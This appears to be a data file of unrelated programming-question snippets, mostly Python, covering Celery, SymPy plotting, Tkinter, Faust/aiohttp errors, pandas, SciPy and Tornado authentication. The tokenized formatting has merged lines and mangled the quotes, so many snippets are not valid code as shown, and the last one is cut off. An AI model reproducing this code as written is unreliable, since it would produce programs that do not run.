"@ app.taskdef retrieve_details ( ) : for p in PObj.objects.filter ( some_condition=True ) : p.fetch ( ) def fetch ( self ) : v_data = self.service.getV ( **dict ( Number=self.v.number ) ) response = self.map_response ( v_data ) for key in [ `` some_key '' , '' some_other_key '' , ] : setattr ( self.v , key , response.get ( key ) ) self.v.save ( ) 2017-01-01 10:26:25.634132 < 45 > 1 2017-01-01T10:26:25.457411+00:00 heroku run.5891 - - Error R14 ( Memory quota exceeded ) Go to the log : https : //api.heroku.com/myapps/xxx @ heroku.com/addons/logentriesYou are receiving this email because your Logentries alarm `` Memory quota exceeded '' has been triggered.In context:2017-01-01 10:26:25.568 131 < 45 > 1 2017-01-01T10:26:25.457354+00:00 heroku run.5891 - - Process running mem=595M ( 116.2 % ) 2017-01-01 10:26:25.634 132 < 45 > 1 2017-01-01T10:26:25.457411+00:00 heroku run.5891 - - Error R14 ( Memory quota exceeded )"
"from sympy import init_sessioninit_session ( ) from sympy.plotting.plot import Plot , ContourSeries # show plot centered at 0,0x_min = -7x_max = 7y_min = -5y_max = 5 # contour plot of inverted conemy_plot = Plot ( ContourSeries ( sqrt ( x**2 + y**2 ) , ( x , x_min , x_max ) , ( y , y_min , y_max ) ) ) my_plot.show ( ) class MatplotlibBackend ( BaseBackend ) : ... def process_series ( self ) : ... for s in self.parent._series : # Create the collections ... elif s.is_contour : self.ax.contour ( *s.get_meshes ( ) ) # returned ContourSet not saved by SymPy # Create a simple contour plot with labels using default colors.plt.figure ( ) CS = plt.contour ( X , Y , Z ) # CS is the ContourSetplt.clabel ( CS , inline=1 , fontsize=10 ) plt.title ( 'Simplest default with labels ' )"
"from tkinter import *class App : def __init__ ( self , master ) : frame = Frame ( master ) frame.pack ( ) self.button = Button ( frame , text= '' QUIT '' , fg= '' red '' , command=frame.quit ) self.button.pack ( side=LEFT ) self.hi_there = Button ( frame , text= '' Hello '' , command=self.say_hi ) self.hi_there.pack ( side=LEFT ) def say_hi ( self ) : print ( `` hi there , everyone ! `` ) root = Tk ( ) app = App ( root ) root.mainloop ( )"
"from IPy import IPlen ( IP ( '2001 : :/64 ' ) ) Traceback ( most recent call last ) : File `` test.py '' , line 2 , in < module > len ( IP ( '2001 : :/64 ' ) ) OverflowError : long int too large to convert to int"
"import qualified Data.Aeson as Aimport qualified Data.ByteString.Char8 as BSimport qualified Data.ByteString.Lazy.Char8 as BSLimport Data.Listimport Data.Maybeimport System.Environmentparse : : String - > A.Valueparse = fromJust . A.decode . BSL.packisInteger xs = case reads xs : : [ ( Integer , String ) ] of [ ( _ , `` '' ) ] - > True _ - > Falsenavigate : : A.Value - > String - > Stringnavigate value [ ] = valuenavigate value [ x : xs ] | isInteger x = ? ? ? -- value is an array , get the xth element of it . | otherwise = ? ? ? -- value is an map , x is a key in it.main : : IO ( ) main = do [ filename : path ] < - getArgs contents < - readFile filename let d = parse contents putStrLn ( show ( navigate d path ) ) from json import loadfrom sys import argv def navigate ( obj , path ) : if not path : return obj head , tail = path [ 0 ] , path [ 1 : ] return navigate ( obj [ int ( head ) if head.isdigit ( ) else head ] , tail ) if __name__ == '__main__ ' : fname , path = argv [ 1 ] , argv [ 2 : ] obj = load ( open ( fname ) ) print navigate ( obj , path ) $ cat data.json { `` foo '' : [ [ 1 , 2 , 3 , { `` bar '' : `` barf '' } ] ] } $ python showjson.py data.json foo 0 3 barbarf"
"import faustfrom faust.web import Responseapp = faust.App ( `` app1 '' , broker= '' kafka : //localhost:29092 '' , value_serializer= '' raw '' ) test_topic = app.topic ( `` test '' ) @ app.agent ( test_topic ) async def test_topic_agent ( stream ) : async for value in stream : print ( f '' test_topic_agent RECEIVED -- { value ! r } '' ) yield value @ app.page ( `` / '' ) async def index ( self , request ) : return self.text ( `` yey '' ) import asynciofrom aiohttp import webfrom aiohttp.web import Responsefrom aiohttp_sse import sse_responsefrom datetime import datetimeasync def hello ( request ) : loop = request.app.loop async with sse_response ( request ) as resp : while True : data = 'Server Time : { } '.format ( datetime.now ( ) ) print ( data ) await resp.send ( data ) await asyncio.sleep ( 1 , loop=loop ) return respasync def index ( request ) : d = `` '' '' < html > < body > < script > var evtSource = new EventSource ( `` /hello '' ) ; evtSource.onmessage = function ( e ) { document.getElementById ( 'response ' ) .innerText = e.data } < /script > < h1 > Response from server : < /h1 > < div id= '' response '' > < /div > < /body > < /html > `` '' '' return Response ( text=d , content_type='text/html ' ) app = web.Application ( ) app.router.add_route ( 'GET ' , '/hello ' , hello ) app.router.add_route ( 'GET ' , '/ ' , index ) web.run_app ( app , host='127.0.0.1 ' , port=8080 ) import faustfrom faust.web import Responseapp = faust.App ( `` app1 '' , broker= '' kafka : //localhost:29092 '' , value_serializer= '' raw '' ) test_topic = app.topic ( `` test '' ) # @ app.agent ( test_topic ) # async def test_topic_agent ( stream ) : # async for value in stream : # print ( f '' test_topic_agent RECEIVED -- { value ! r } '' ) # yield value @ app.page ( `` / '' , name= '' t1 '' ) @ app.agent ( test_topic , name= '' t '' ) async def index ( self , request ) : return self.text ( `` yey '' ) Traceback ( most recent call last ) : File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/faust/cli/base.py '' , line 299 , in find_app val = symbol_by_name ( app , imp=imp ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/mode/utils/imports.py '' , line 262 , in symbol_by_name module = imp ( # type : ignore File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/mode/utils/imports.py '' , line 376 , in import_from_cwd return imp ( module , package=package ) File `` /Users/maverick/.pyenv/versions/3.8.1/lib/python3.8/importlib/__init__.py '' , line 127 , in import_module return _bootstrap._gcd_import ( name [ level : ] , package , level ) File `` < frozen importlib._bootstrap > '' , line 1014 , in _gcd_import File `` < frozen importlib._bootstrap > '' , line 991 , in _find_and_load File `` < frozen importlib._bootstrap > '' , line 975 , in _find_and_load_unlocked File `` < frozen importlib._bootstrap > '' , line 671 , in _load_unlocked File `` < frozen importlib._bootstrap_external > '' , line 783 , in exec_module File `` < frozen importlib._bootstrap > '' , line 219 , in _call_with_frames_removed File `` /Users/maverick/company/demo1/baiohttp-demo/app1.py '' , line 18 , in < module > async def index ( self , request ) : File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/faust/app/base.py '' , line 1231 , in _decorator view = view_base.from_handler ( cast ( ViewHandlerFun , fun ) ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/faust/web/views.py '' , line 50 , in from_handler return type ( fun.__name__ , ( cls , ) , { AttributeError : 'Agent ' object has no attribute '__name__'During handling of the above exception , another exception occurred : Traceback ( most recent call last ) : File `` /Users/maverick/.pyenv/versions/faust_demo/bin/faust '' , line 8 , in < module > sys.exit ( cli ( ) ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/click/core.py '' , line 829 , in __call__ return self.main ( *args , **kwargs ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/click/core.py '' , line 781 , in main with self.make_context ( prog_name , args , **extra ) as ctx : File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/faust/cli/base.py '' , line 407 , in make_context self._maybe_import_app ( ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/faust/cli/base.py '' , line 372 , in _maybe_import_app find_app ( appstr ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/faust/cli/base.py '' , line 303 , in find_app val = imp ( app ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/mode/utils/imports.py '' , line 376 , in import_from_cwd return imp ( module , package=package ) File `` /Users/maverick/.pyenv/versions/3.8.1/lib/python3.8/importlib/__init__.py '' , line 127 , in import_module return _bootstrap._gcd_import ( name [ level : ] , package , level ) File `` < frozen importlib._bootstrap > '' , line 1014 , in _gcd_import File `` < frozen importlib._bootstrap > '' , line 991 , in _find_and_load File `` < frozen importlib._bootstrap > '' , line 975 , in _find_and_load_unlocked File `` < frozen importlib._bootstrap > '' , line 671 , in _load_unlocked File `` < frozen importlib._bootstrap_external > '' , line 783 , in exec_module File `` < frozen importlib._bootstrap > '' , line 219 , in _call_with_frames_removed File `` /Users/maverick/company/demo1/baiohttp-demo/app1.py '' , line 18 , in < module > async def index ( self , request ) : File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/faust/app/base.py '' , line 1231 , in _decorator view = view_base.from_handler ( cast ( ViewHandlerFun , fun ) ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/faust/web/views.py '' , line 50 , in from_handler return type ( fun.__name__ , ( cls , ) , { AttributeError : 'Agent ' object has no attribute '__name__ ' import faustfrom faust.web import Responseapp = faust.App ( `` app1 '' , broker= '' kafka : //localhost:29092 '' , value_serializer= '' raw '' ) test_topic = app.topic ( `` test '' ) # @ app.agent ( test_topic ) # async def test_topic_agent ( stream ) : # async for value in stream : # print ( f '' test_topic_agent RECEIVED -- { value ! r } '' ) # yield value @ app.agent ( test_topic , name= '' t '' ) @ app.page ( `` / '' , name= '' t1 '' ) async def index ( self , request ) : return self.text ( `` yey '' ) [ 2020-03-28 10:32:50,676 ] [ 29976 ] [ INFO ] [ ^ -- Producer ] : Creating topic 'app1-__assignor-__leader ' [ 2020-03-28 10:32:50,695 ] [ 29976 ] [ INFO ] [ ^ -- ReplyConsumer ] : Starting ... [ 2020-03-28 10:32:50,695 ] [ 29976 ] [ INFO ] [ ^ -- AgentManager ] : Starting ... [ 2020-03-28 10:32:50,695 ] [ 29976 ] [ INFO ] [ ^ -- -Agent : app1.index ] : Starting ... [ 2020-03-28 10:32:50,696 ] [ 29976 ] [ ERROR ] [ ^Worker ] : Error : TypeError ( `` __init__ ( ) missing 1 required positional argument : 'web ' '' ) Traceback ( most recent call last ) : File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/mode/worker.py '' , line 273 , in execute_from_commandline self.loop.run_until_complete ( self._starting_fut ) File `` /Users/maverick/.pyenv/versions/3.8.1/lib/python3.8/asyncio/base_events.py '' , line 612 , in run_until_complete return future.result ( ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/mode/services.py '' , line 736 , in start await self._default_start ( ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/mode/services.py '' , line 743 , in _default_start await self._actually_start ( ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/mode/services.py '' , line 767 , in _actually_start await child.maybe_start ( ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/mode/services.py '' , line 795 , in maybe_start await self.start ( ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/mode/services.py '' , line 736 , in start await self._default_start ( ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/mode/services.py '' , line 743 , in _default_start await self._actually_start ( ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/mode/services.py '' , line 767 , in _actually_start await child.maybe_start ( ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/mode/services.py '' , line 795 , in maybe_start await self.start ( ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/mode/services.py '' , line 736 , in start await self._default_start ( ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/mode/services.py '' , line 743 , in _default_start await self._actually_start ( ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/mode/services.py '' , line 760 , in _actually_start await self.on_start ( ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/faust/agents/manager.py '' , line 58 , in on_start await agent.maybe_start ( ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/mode/services.py '' , line 795 , in maybe_start await self.start ( ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/mode/services.py '' , line 736 , in start await self._default_start ( ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/mode/services.py '' , line 743 , in _default_start await self._actually_start ( ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/mode/services.py '' , line 760 , in _actually_start await self.on_start ( ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/faust/agents/agent.py '' , line 282 , in on_start await self._on_start_supervisor ( ) File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/faust/agents/agent.py '' , line 312 , in _on_start_supervisor res = await self._start_one ( File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/faust/agents/agent.py '' , line 251 , in _start_one return await self._start_task ( File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/faust/agents/agent.py '' , line 617 , in _start_task actor = self ( File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/faust/agents/agent.py '' , line 525 , in __call__ return self.actor_from_stream ( stream , File `` /Users/maverick/.pyenv/versions/3.8.1/envs/faust_demo/lib/python3.8/site-packages/faust/agents/agent.py '' , line 552 , in actor_from_stream res = self.fun ( actual_stream ) TypeError : __init__ ( ) missing 1 required positional argument : 'web ' [ 2020-03-28 10:32:50,703 ] [ 29976 ] [ INFO ] [ ^Worker ] : Stopping ... [ 2020-03-28 10:32:50,703 ] [ 29976 ] [ INFO ] [ ^-App ] : Stopping ... [ 2020-03-28 10:32:50,703 ] [ 29976 ] [ INFO ] [ ^-App ] : Flush producer buffer ... [ 2020-03-28 10:32:50,703 ] [ 29976 ] [ INFO ] [ ^ -- TableManager ] : Stopping ..."
svn cat file : // $ REPO/trunk/my_script.py | python - -- argument1 -- argument2 curl http : //example.com/huge_file.txt | python my_script.py
"> cat a b c # ! /bin/env pythonfiles = ' a b c'all_lines = [ ] for f in files.split ( ) : lines = open ( f , ' r ' ) .readlines ( ) for line in lines : all_lines.append ( f + ' , ' + line.strip ( ) ) fout = open ( 'out.csv ' , ' w ' ) fout.write ( '\n'.join ( all_lines ) ) fout.close ( )"
"from com.impactpy.gaesessions import SessionMiddleware COOKIE_KEY = 'nice try ' def webapp_add_wsgi_middleware ( app ) : from google.appengine.ext.appstats import recording app = SessionMiddleware ( app , cookie_key=COOKIE_KEY ) app = recording.appstats_wsgi_middleware ( app ) return app from google.appengine.ext.appstats import recordingdef webapp_add_wsgi_middleware ( app ) : app = recording.appstats_wsgi_middleware ( app ) return app builtins : - datastore_admin : on- remote_api : on- appstats : on application = webapp.WSGIApplication ( [ ( '/handler ' , myHandlerClass ) ] , debug=True ) def main ( ) : run_wsgi_app ( application ) if __name__ == `` __main__ '' : main ( )"
"def ddply ( rows , *cols , op=lambda group_rows : group_rows ) : `` '' '' group rows by cols , then apply the function op to each group and return the results aggregating all groups rows is a dict or list of values read by csv.reader or csv.DictReader '' '' '' pass"
"from itertools import *def generator ( a , b ) : first = True for i , s in izip ( a , b ) : if first : yield `` First line '' first = False else : yield `` Some later line '' if i == 0 : yield `` The parameter vanishes . '' else : yield `` The parameter is : '' yield i yield `` The strings are : '' comma = False for t in s : if comma : yield ' , ' else : comma = True yield t from itertools import *def generator2 ( a , b ) : return ( z for i , s , c in izip ( a , b , count ( ) ) for y in ( ( `` First line '' if c == 0 else `` Some later line '' , ) , ( `` The parameter vanishes . `` , ) if i == 0 else ( `` The parameter is : '' , i ) , ( `` The strings are : '' , ) , islice ( ( x for t in s for x in ( ' , ' , t ) ) , 1 , None ) ) for z in y ) > > > a = ( 1 , 0 , 2 ) , ( `` ab '' , `` cd '' , `` ef '' ) > > > print ( [ x for x in generator ( a , b ) ] ) [ 'First line ' , 'The parameter is : ' , 1 , 'The strings are : ' , ' a ' , ' , ' , ' b ' , 'Some later line ' , 'The parameter vanishes . ' , 'The strings are : ' , ' c ' , ' , ' , 'd ' , 'Some later line ' , 'The parameter is : ' , 2 , 'The strings are : ' , ' e ' , ' , ' , ' f ' ] > > > print ( [ x for x in generator2 ( a , b ) ] ) [ 'First line ' , 'The parameter is : ' , 1 , 'The strings are : ' , ' a ' , ' , ' , ' b ' , 'Some later line ' , 'The parameter vanishes . ' , 'The strings are : ' , ' c ' , ' , ' , 'd ' , 'Some later line ' , 'The parameter is : ' , 2 , 'The strings are : ' , ' e ' , ' , ' , ' f ' ]"
"x = pd.DataFrame ( [ [ ' a ' , 1 ] , [ ' b ' , 1 ] , [ ' a ' , 2 ] , [ ' b ' , 2 ] , [ ' a ' , 3 ] , [ ' b ' , 3 ] ] , columns= [ ' A ' , ' B ' ] ) g = x.groupby ( ' A ' ) A B0 a 11 b 1 A B0 a 11 b 12 a 23 b 2"
"CREATE TABLE some_table ( id int ( 11 ) NOT NULL AUTO_INCREMENT , some_text varchar ( 2048 ) DEFAULT NULL , PRIMARY KEY ( id ) , KEY some_text ( some_text ( 1024 ) ) , # < - this line ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8 ROW_FORMAT=COMPRESSED ; class SomeTable ( BaseModel ) : __tablename__ = 'some_table ' __seqname__ = 'some_table_id_seq ' id = sa.Column ( sa.Integer ( 11 ) , sa.Sequence ( __seqname__ ) , primary_key=True ) some_text = sa.Column ( sa.String ( 2048 ) , index=True ) # < - this line some_text = sa.Column ( sa.String ( 2048 ) , index=True , index_length=1024 )"
"import numpy as np import scipy.linalg matrix = np.matrix A = matrix ( [ [ 0.00000000e+00 , 2.96156260e+01 , 0.00000000e+00 , -1.00000000e+00 ] , [ -2.96156260e+01 , -6.77626358e-21 , 1.00000000e+00 , -2.11758237e-22 ] , [ 0.00000000e+00 , 0.00000000e+00 , 2.06196064e+00 , 5.59422224e+01 ] , [ 0.00000000e+00 , 0.00000000e+00 , 2.12407340e+01 , -2.06195974e+00 ] ] ) B = matrix ( [ [ 0. , 0. , 0 . ] , [ 0. , 0. , 0 . ] , [ -342.35401351 , -14204.86532216 , 31.22469724 ] , [ 1390.44997337 , 342.33745324 , -126.81720597 ] ] ) Q = matrix ( [ [ 5.00000001 , 0. , 0. , 0 . ] , [ 0. , 5.00000001 , 0. , 0 . ] , [ 0. , 0. , 0. , 0 . ] , [ 0. , 0. , 0. , 0 . ] ] ) R = matrix ( [ [ -3.75632852e+04 , -0.00000000e+00 , 0.00000000e+00 ] , [ -0.00000000e+00 , -3.75632852e+04 , 0.00000000e+00 ] , [ 0.00000000e+00 , 0.00000000e+00 , 4.00000000e+00 ] ] ) counter = 0 while counter < 3 : counter +=1 X = scipy.linalg.solve_continuous_are ( A , B , Q , R ) print ( -3449.15531628 - X [ 0,0 ] ) lapack_opt_info : libraries = [ 'mkl_blas95 ' , 'mkl_lapack95 ' , 'mkl_intel_c ' , 'mkl_intel_thread ' , 'mkl_core ' , 'libiomp5md ' , 'mkl_blas95 ' , 'mkl_lapack95 ' , 'mkl_intel_c ' , 'mkl_intel_thread ' , 'mkl_core ' , 'libiomp5md ' ] library_dirs = [ ' c : /Program Files ( x86 ) /Intel/Composer XE 2013 SP1/mkl/lib/ia32 ' , ' C : /Program Files ( x86 ) /Intel/Composer XE 2013 SP1/compiler/lib/ia32 ' ] define_macros = [ ( 'SCIPY_MKL_H ' , None ) ] include_dirs = [ ' c : /Program Files ( x86 ) /Intel/Composer XE 2013 SP1/mkl/include ' ] blas_opt_info : libraries = [ 'mkl_blas95 ' , 'mkl_lapack95 ' , 'mkl_intel_c ' , 'mkl_intel_thread ' , 'mkl_core ' , 'libiomp5md ' ] library_dirs = [ ' c : /Program Files ( x86 ) /Intel/Composer XE 2013 SP1/mkl/lib/ia32 ' , ' C : /Program Files ( x86 ) /Intel/Composer XE 2013 SP1/compiler/lib/ia32 ' ] define_macros = [ ( 'SCIPY_MKL_H ' , None ) ] include_dirs = [ ' c : /Program Files ( x86 ) /Intel/Composer XE 2013 SP1/mkl/include ' ] openblas_info : NOT AVAILABLElapack_mkl_info : libraries = [ 'mkl_blas95 ' , 'mkl_lapack95 ' , 'mkl_intel_c ' , 'mkl_intel_thread ' , 'mkl_core ' , 'libiomp5md ' , 'mkl_blas95 ' , 'mkl_lapack95 ' , 'mkl_intel_c ' , 'mkl_intel_thread ' , 'mkl_core ' , 'libiomp5md ' ] library_dirs = [ ' c : /Program Files ( x86 ) /Intel/Composer XE 2013 SP1/mkl/lib/ia32 ' , ' C : /Program Files ( x86 ) /Intel/Composer XE 2013 SP1/compiler/lib/ia32 ' ] define_macros = [ ( 'SCIPY_MKL_H ' , None ) ] include_dirs = [ ' c : /Program Files ( x86 ) /Intel/Composer XE 2013 SP1/mkl/include ' ] blas_mkl_info : libraries = [ 'mkl_blas95 ' , 'mkl_lapack95 ' , 'mkl_intel_c ' , 'mkl_intel_thread ' , 'mkl_core ' , 'libiomp5md ' ] library_dirs = [ ' c : /Program Files ( x86 ) /Intel/Composer XE 2013 SP1/mkl/lib/ia32 ' , ' C : /Program Files ( x86 ) /Intel/Composer XE 2013 SP1/compiler/lib/ia32 ' ] define_macros = [ ( 'SCIPY_MKL_H ' , None ) ] include_dirs = [ ' c : /Program Files ( x86 ) /Intel/Composer XE 2013 SP1/mkl/include ' ] mkl_info : libraries = [ 'mkl_blas95 ' , 'mkl_lapack95 ' , 'mkl_intel_c ' , 'mkl_intel_thread ' , 'mkl_core ' , 'libiomp5md ' ] library_dirs = [ ' c : /Program Files ( x86 ) /Intel/Composer XE 2013 SP1/mkl/lib/ia32 ' , ' C : /Program Files ( x86 ) /Intel/Composer XE 2013 SP1/compiler/lib/ia32 ' ] define_macros = [ ( 'SCIPY_MKL_H ' , None ) ] include_dirs = [ ' c : /Program Files ( x86 ) /Intel/Composer XE 2013 SP1/mkl/include ' ] None"
"def mymethod ( self , params ) ... return def mystaticethod ( params ) ... returnmystaticmethod = staticmethod ( mystaticmethod )"
"use strict ; use Win32 : :OLE qw ( in with valof OVERLOAD ) ; use Win32 : :OLE : :Const 'Microsoft.Word ' ; # wd constantsuse Win32 : :OLE : :Variant ; $ Win32 : :OLE : :Warn = 3 ; my $ true = Variant ( VT_BOOL , 1 ) ; my $ false = Variant ( VT_BOOL , 0 ) ; use File : :Spec ; use File : :Basename ; # # Original & New Filemy $ DocFile = & transform_path ( $ ARGV [ 0 ] ) ; my $ NewFile = ( $ ARGV [ 1 ] ? & transform_path ( $ ARGV [ 1 ] ) : $ DocFile ) ; [ -e $ DocFile ] || die `` *** Can not open ' $ DocFile'\n '' ; # # # Transform pathsub transform_path { my $ path = shift ; if ( ! File : :Spec- > file_name_is_absolute ( $ path ) ) { my $ abs = File : :Spec- > rel2abs ( $ path ) ; $ path = $ abs ; } else { $ path=~s % /+ % \\ % g ; } return $ path ; } # # Autoflush $ | = 1 ; # # # opening file : try with `` new '' function , otherwise use `` GetActiveObject '' my $ Word ; eval { $ Word = Win32 : :OLE- > GetActiveObject ( 'Word.Application ' ) || Win32 : :OLE- > new ( 'Word.Application ' , 'Quit ' ) ; } ; if ( $ @ ) { print `` Please open MS Word manually before continuing\n '' ; print `` ... Press ENTER to continue ... \n '' ; < STDIN > ; $ Word = Win32 : :OLE- > GetActiveObject ( 'Word.Application ' , 'Quit ' ) ; } print `` Opening ' $ DocFile'\n '' ; my $ document = $ Word- > Documents- > Open ( { FileName = > $ DocFile , ConfirmConversions = > 0 } ) ; die `` Can not open ' $ DocFile'\n '' unless defined $ document ; $ document- > Activate ( ) ; $ Word- > ActiveWindow- > ActivePane- > View- > { Type } = wdPrintView ; # # # Accept all changesprint ( `` Accepting all changes\n '' ) ; $ Word- > ActiveDocument- > { TrackRevisions } = $ false ; $ Word- > WordBasic- > AcceptAllChangesInDoc ( ) ; # # # Save and Closeif ( $ NewFile eq $ DocFile ) { $ document- > Save ( ) ; $ document- > Close ( ) ; } else { $ document- > SaveAs ( $ NewFile ) ; $ document- > Close ( wdDoNotSaveChanges ) ; } print `` Saving in ' $ NewFile'\n '' # # END # #"
"from scipy import sparsefrom numpy.random import RandomStatep = sparse.rand ( 10 , 10 , 0.1 , random_state=RandomState ( 1 ) ) print p ( 0 , 0 ) 0.419194514403 ( 0 , 3 ) 0.0273875931979 ( 1 , 4 ) 0.558689828446 ( 2 , 7 ) 0.198101489085 ( 3 , 5 ) 0.140386938595 ( 4 , 1 ) 0.204452249732 ( 4 , 3 ) 0.670467510178 ( 8 , 1 ) 0.878117436391 ( 9 , 0 ) 0.685219500397 ( 9 , 3 ) 0.417304802367"
"df [ ' A ' ] = pd.Series ( [ ' [ `` entry11 '' ] ' , ' [ `` entry21 '' , '' entry22 '' ] ' , ' [ `` entry31 '' , '' entry32 '' ] ' ] ) df [ ' A ' ] = df [ ' A ' ] .replace ( `` ' '' , '' , regex=True ) . replace ( '\ [ ' , '' , regex=True ) . replace ( '\ ] ' , '' , regex=True ) . str.split ( `` , '' )"
"a = [ ( 1 , ' a ' ) , ( 4 , ' a ' ) , ( 6 , ' b ' ) , ( 7 , ' c ' ) , ( 12 , ' a ' ) ] b = [ ( 5 , 'd ' ) , ( 10 , ' c ' ) , ( 11 , ' e ' ) ] c = [ ( 0 , ' b ' ) , ( 3 , 'd ' ) ] ( 0 , ' b ' ) , ( 1 , ' a ' ) , ( 3 , 'd ' ) , ( 4 , ' a ' ) , ..."
jupyter 1.0.0 py35_1jupyter-client 4.1.1 < pip > jupyter-console 4.1.0 < pip > jupyter-core 4.0.6 < pip > jupyter_client 4.1.1 py35_0jupyter_console 4.1.0 py35_0jupyter_core 4.0.6 py35_0
"signals = [ 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 0 , 0 ] # For n = 2 : valid_s = [ 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 ] # For n = 3 : valid_s = [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 0 , 0 ] # For n = 4 : valid_s = [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 0 ] S = signals # For n = 2 [ S [ i ] if S [ i ] == S [ i-1 ] else S [ i-2 ] for i , _ in enumerate ( S ) ] # gives [ 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 ] # For n = 3 [ S [ i ] if S [ i ] == S [ i-1 ] == S [ i-2 ] else S [ i-3 ] for i , _ in enumerate ( S ) ] # gives [ 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 ]"
"bonds = [ ( 0. , 0.99 ) , ( -30 , 30 ) , ( -30 , 30 ) , ( 0. , 30 ) , ( 0. , 30 ) , ( -0.99 , 0.99 ) , ( 0. , 0.99 ) , ( -30 , 30 ) , ( -30 , 30 ) , ( 0. , 30 ) , ( 0. , 30 ) , ( -0.99 , 0.99 ) , ( 0. , 0.99 ) , ( -30 , 30 ) , ( -30 , 30 ) , ( 0. , 30 ) , ( 0. , 30 ) , ( -0.99 , 0.99 ) , ] bonds = [ [ ( 0. , 0.99 ) , ( -30 , 30 ) , ( -30 , 30 ) , ( 0. , 30 ) , ( 0. , 30 ) , ( -0.99 , 0.99 ) ] for i in range ( 3 ) ] [ [ ( 0.0 , 0.99 ) , ( -30 , 30 ) , ( -30 , 30 ) , ( 0.0 , 30 ) , ( 0.0 , 30 ) , ( -0.99 , 0.99 ) ] , [ ( 0.0 , 0.99 ) , ( -30 , 30 ) , ( -30 , 30 ) , ( 0.0 , 30 ) , ( 0.0 , 30 ) , ( -0.99 , 0.99 ) ] , [ ( 0.0 , 0.99 ) , ( -30 , 30 ) , ( -30 , 30 ) , ( 0.0 , 30 ) , ( 0.0 , 30 ) , ( -0.99 , 0.99 ) ] ]"
"ids = [ 22 , 5 , 4 , 0 , 100 ] targets = [ 5 , 0 ] > > > [ 1,3 ] > > > ids = np.array ( [ 22 , 5 , 4 , 0 , 100 ] ) > > > targets = [ 5 , 0 ] > > > sort = np.argsort ( ids ) > > > ids [ sort ] [ 0,4,5,22,100 ] > > > np.searchsorted ( ids , targets , sorter=sort ) [ 2,0 ]"
"def authenticated_async ( method ) : @ gen.coroutine def wrapper ( self , *args , **kwargs ) : self._auto_finish = False self.current_user = yield gen.Task ( self.get_current_user_async ) if not self.current_user : self.redirect ( self.reverse_url ( 'login ' ) ) else : result = method ( self , *args , **kwargs ) # updates if result is not None : yield result return wrapperclass BaseClass ( ) : @ gen.coroutine def get_current_user_async ( self , ) : auth_cookie = self.get_secure_cookie ( 'user ' ) # cfae7a25-2b8b-46a6-b5c4-0083a114c40e user_id = yield gen.Task ( c.hget , 'auths ' , auth_cookie ) # 16 print ( 123 , user_id ) return auth_cookie if auth_cookie else None class IndexPageHandler ( BaseClass , RequestHandler ) : @ authenticated_async def get ( self ) : self.render ( `` index.html '' ) 127.0.0.1:6379 > hget auths cfae7a25-2b8b-46a6-b5c4-0083a114c40e '' 16 '' user_id = yield gen.Task ( c.hget , 'auths ' , auth_cookie ) print ( 123 , user_id 